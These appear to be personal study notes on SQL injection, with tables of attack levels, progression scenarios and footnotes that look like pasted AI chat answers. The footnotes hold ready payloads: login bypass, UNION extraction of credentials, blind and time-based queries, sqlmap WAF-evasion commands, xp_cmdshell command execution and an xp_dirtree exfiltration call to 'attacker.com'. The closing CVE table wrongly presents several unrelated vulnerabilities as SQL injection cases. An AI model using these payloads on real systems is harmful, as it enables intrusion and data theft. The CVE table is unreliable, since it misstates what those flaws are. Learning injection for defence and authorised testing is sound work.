
Most of the attacks will occurs in one of these:
- Select
- Insert
- Update
- Order By
- Where


There are two types of Ordering in Sql injection:
- **First-Order Sql Injection** (Directly takes from HTTP)
- **Second-Order Sql Injection** (Takes from HTTP and Stores for future use)

## Example Attack Chains (Realistic Progression)

### 🧪 **Beginner Scenario**:

> Login form vulnerable to simple `' OR '1'='1`  
> ➡️ Login bypass  
> ➡️ Union-based SQLi to extract credentials

### 🐍 **Intermediate Scenario**:

> No visible errors → use Boolean Blind SQLi  
> ➡️ Extract usernames via logical inferences  
> ➡️ Find secondary injection in profile edit → exploit via Second-Order SQLi

### 🧨 **Advanced Scenario**:

> SQLi in admin panel → drop shell via `OUTFILE`  
> ➡️ Gain shell access  
> ➡️ Upload ransomware or C2 beacon  
> ➡️ Begin lateral movement

---

## 📌 Pro Tip: SQL Injection ↔ Ransomware Risk

Many high-profile ransomware events **began with SQLi** as the initial access vector.

**Examples:**

- **CVE-2023-34362 (MOVEit Transfer)** → SQLi to RCE → Cl0p ransomware
    
- **CVE-2019-11510 (Pulse Secure)** → Not SQLi but paired with credential theft and lateral movement for ransomware ops

```


```
![[portswigger_net_web_security_sql_injection_cheat_sheet.pdf]]




[^1]:Here are some practical tool commands and scripts to test SQL injection at each level:
	
	**Beginner Level with sqlmap:**  
	To test a URL parameter for basic SQL injection:  
	```bash
	sqlmap -u "http://example.com/page?id=1" --batch
	```
	This runs automated tests including tautology, error-based, and union-based injections.
	
	**Intermediate Level with sqlmap (Blind Injection):**  
	To specifically test for blind SQL injection with time delays:  
	```bash
	sqlmap -u "http://example.com/page?id=1" --technique=BT --time-sec=5 --batch
	```
	`--technique=BT` tells sqlmap to use Boolean and Time-based blind techniques.
	
	**Intermediate Level with Burp Suite Intruder:**  
	Set up a payload position in a vulnerable parameter, then use payloads like:  
	```
	' AND 1=1 --  
	' AND 1=2 --  
	```
	Observe differences in responses to infer data.
	
	**Advanced Level with sqlmap (Bypassing WAFs):**  
	Use tamper scripts to evade filters:  
	```bash
	sqlmap -u "http://example.com/page?id=1" --tamper=space2comment --batch
	```
	`space2comment` replaces spaces with comments to bypass simple WAFs.
	
	**Advanced Level Manual Exploit (Stored Procedure Execution):**  
	If you find xp_cmdshell enabled on MSSQL, you can try:  
	```sql
	'; EXEC xp_cmdshell('whoami') --
	```
	Inject this in a vulnerable input to execute OS commands.
	
	**Second-Order SQL Injection Testing:**  
	Inject payloads into one input field (e.g., user profile) and later test if those payloads execute in another context, often requiring manual logic and multiple steps.
	
	Would you like me to help you craft a specific test for a target or explain how to interpret sqlmap results?
	

[^2]: Certainly! Here are examples for each SQL injection level with three key topics per level:
	
	**Beginner Level**
	
	1. **Tautology-based Injection**  
	Payload: `' OR '1'='1`  
	Example:  
	```sql
	SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '';
	```
	This bypasses authentication by making the WHERE clause always true.
	
	2. **Error-based Injection**  
	Payload: `' OR 1=CONVERT(int,(SELECT @@version))--`  
	Example:  
	```sql
	SELECT * FROM products WHERE id = '' OR 1=CONVERT(int,(SELECT @@version))--';
	```
	This triggers an error revealing database version info.
	
	3. **Union-based Injection**  
	Payload: `' UNION SELECT username, password FROM users --`  
	Example:  
	```sql
	SELECT id, name FROM products WHERE id = '' UNION SELECT username, password FROM users --';
	```
	This extracts usernames and passwords by combining query results.
	
	---
	
	**Intermediate Level**
	
	1. **Boolean-based Blind Injection**  
	Payload: `' AND 1=1 --` (true) vs `' AND 1=2 --` (false)  
	Example:  
	```sql
	SELECT * FROM users WHERE username = 'admin' AND 1=1 --';
	```
	If the page behaves differently between true and false, you infer data bit by bit.
	
	2. **Time-based Blind Injection**  
	Payload: `' IF (SUBSTRING((SELECT database()),1,1)='a') WAITFOR DELAY '00:00:05' --` (MSSQL)  
	Example:  
	```sql
	SELECT * FROM users WHERE username = '' IF (SUBSTRING((SELECT database()),1,1)='a') WAITFOR DELAY '00:00:05' --';
	```
	If the response delays, you confirm the condition is true.
	
	3. **Out-of-Band (OOB) Injection (Intermediate)**  
	Payload: `'; EXEC xp_dirtree '\\attacker.com\share' --` (MSSQL)  
	Example:  
	```sql
	SELECT * FROM users WHERE username = ''; EXEC xp_dirtree '\\attacker.com\share' --';
	```
	Triggers the database to make a DNS request to attacker’s server, exfiltrating data.
	
	---
	
	**Advanced Level**
	
	1. **Bypassing WAFs and Filters**  
	Payload: `'+UnIoN+SeLeCt+1,2,3--` with mixed case and spaces  
	Example:  
	```sql
	SELECT * FROM products WHERE id = ''+UnIoN+SeLeCt+1,2,3--';
	```
	Using case variations and spacing to evade simple filters.
	
	2. **Second-Order SQL Injection**  
	Payload stored in one input, executed later in a different query.  
	Example: Inject `' OR '1'='1` into a profile field that is later used unsafely in an admin query.
	
	3. **Leveraging Stored Procedures**  
	Payload: `'; EXEC xp_cmdshell('whoami') --` (MSSQL)  
	Example:  
	```sql
	SELECT * FROM users WHERE username = ''; EXEC xp_cmdshell('whoami') --';
	```
	Executes OS commands via database stored procedures for remote code execution.
	
	---
	
	Would you like me to provide specific tool commands or scripts to test these?








| Level        | Description                                | Complexity            | Common Types at This Level                                                     | Impact                                                            |
| ------------ | ------------------------------------------ | --------------------- | ------------------------------------------------------------------------------ | ----------------------------------------------------------------- |
| **Level 0**  | **No Injection**                           | 🟢                    | - N/A (secure)                                                                 | App uses parameterized queries or ORM                             |
| **Level 1**  | **Basic Injection / Syntax Breaking**      | 🟡 Beginner           | - Error-Based  <br>- Classic In-Band SQLi                                      | Errors returned in response; may reveal DB structure              |
| **Level 2**  | **Data Extraction**                        | 🟡 Beginner           | - Union-Based SQLi  <br>- Error-Based SQLi                                     | Attacker can read usernames, emails, credit card data             |
| **Level 3**  | **Blind Injection**                        | 🟠 Intermediate       | - Boolean-Based  <br>- Time-Based (Delayed Response)                           | App doesn't show errors, but attacker infers true/false or timing |
| **Level 4**  | **Authentication Bypass**                  | 🟠 Intermediate       | - Classic  <br>- Boolean-Based SQLi                                            | Login as admin without password                                   |
| **Level 5**  | **Stored / Second-Order SQLi**             | 🔴 Advanced           | - Second-Order SQLi  <br>- Delayed Execution                                   | Payload stored and executed later — hard to detect                |
| **Level 6**  | **Out-of-Band SQLi (OOB)**                 | 🔴 Advanced           | - OOB via DNS/HTTP  <br>- Data exfil to attacker server                        | Uses network interaction, often bypasses WAFs                     |
| **Level 7**  | **Data Manipulation / Destruction**        | 🔴 Advanced           | - INSERT/UPDATE/DELETE SQLi  <br>- Privilege Escalation                        | Changes or deletes data, may create new admin accounts            |
| **Level 8**  | **File System Access / Code Execution**    | 🔥 Expert             | - SQLi leading to RCE  <br>- File writes via SQL (e.g., `SELECT INTO OUTFILE`) | Drops shells or malware on the server                             |
| **Level 9**  | **Pivot to Ransomware / Lateral Movement** | 🔥🔥 Expert           | - Chained SQLi → RCE → Pivoting                                                | Used by APTs and ransomware gangs to move inside networks         |
| **Level 10** | **Full System/Domain Compromise**          | ☠️ Nation-State Level | - SQLi → Domain Controller Access  <br>- Rootkits, full TTP chain              | Seen in sophisticated, targeted attacks                           |


| 🧭 **Level** | 💣 **Attack Type**                      | 🧩 **Techniques Involved**                     | 🎯 **Attack Goal**                         | 🛠️ **Complexity**          |
| ------------ | --------------------------------------- | ---------------------------------------------- | ------------------------------------------ | --------------------------- |
| **Level 1**  | **Syntax Error Injection**              | `' OR 1=1--`, `'`, `"`, mismatched quotes      | Identify injectable fields, basic bypass   | 🟢 Beginner                 |
| **Level 2**  | **Error-Based SQLi**                    | Break query to trigger DB errors               | Discover DB type, structure                | 🟢 Beginner                 |
| **Level 3**  | **Union-Based SQLi**                    | `UNION SELECT` injections                      | Extract user data, schema                  | 🟡 Beginner                 |
| **Level 4**  | **Boolean Blind SQLi**                  | `AND 1=1`, `AND 1=2`                           | Infer data via true/false behavior         | 🟠 Intermediate             |
| **Level 5**  | **Time-Based Blind SQLi**               | `SLEEP(5)`, `WAITFOR DELAY`                    | Infer data via timing responses            | 🟠 Intermediate             |
| **Level 6**  | **Authentication Bypass**               | `' OR '1'='1`, `admin'--`                      | Gain unauthorized access                   | 🟠 Intermediate             |
| **Level 7**  | **Second-Order SQLi**                   | Stored injection (profile forms, comments)     | Trigger SQL later in internal processes    | 🔴 Advanced                 |
| **Level 8**  | **Out-of-Band SQLi**                    | `LOAD_FILE()`, DNS/HTTP exfil                  | Exfiltrate data without response           | 🔴 Advanced                 |
| **Level 9**  | **SQLi → File Write / Shell Upload**    | `SELECT ... INTO OUTFILE`                      | Drop web shells, lateral movement          | 🔥 Expert                   |
| **Level 10** | **SQLi to RCE → Ransomware Deployment** | SQLi + OS commands (`xp_cmdshell`, `sys_exec`) | Full system control, ransomware detonation | ☠️ Nation-State / APT level |



|🔢 Level|🧠 Complexity|💣 Example CVE / Case|🏢 Affected Vendor / Product|📊 CVSS|🚨 Exploited in Wild|🦠 Ransomware Linked?|
|---|---|---|---|---|---|---|
|**L1**|Beginner|_No CVE_ (Recon-level injection)|Generic login forms|N/A|No|No|
|**L2**|Beginner|CVE-2021-25094|WordPress Plugin _Simple File List_|7.5|No|No|
|**L3**|Beginner|CVE-2022-0492|WordPress Plugin _Booking Calendar_|8.8|No|No|
|**L4**|Intermediate|CVE-2020-2551|Oracle WebLogic Server|9.8|✅ Yes|⚠️ Initial Access Vector|
|**L5**|Intermediate|CVE-2018-7600 (Drupalgeddon 2)|Drupal CMS|9.8|✅ Yes|✅ Used in web shells & ransomware|
|**L6**|Intermediate|CVE-2021-22941|Fortinet FortiWeb|7.2|Yes (PoC available)|Possibly|
|**L7**|Advanced|CVE-2021-21311|Grafana (stored XSS → SQLi risk)|7.1|No|Not directly|
|**L8**|Advanced|CVE-2020-9484|Apache Tomcat (via serialized objects)|9.8|✅ Yes|🔥 Remote shell deployment path|
|**L9**|Expert|CVE-2023-34362|MOVEit Transfer (Progress Software)|9.8|✅ Actively Exploited|✅ Cl0p Ransomware|
|**L10**|Nation-State|CVE-2021-40539|Zoho ManageEngine ADSelfService Plus|9.8|✅ Yes|✅ Used in APT attacks + ransomware|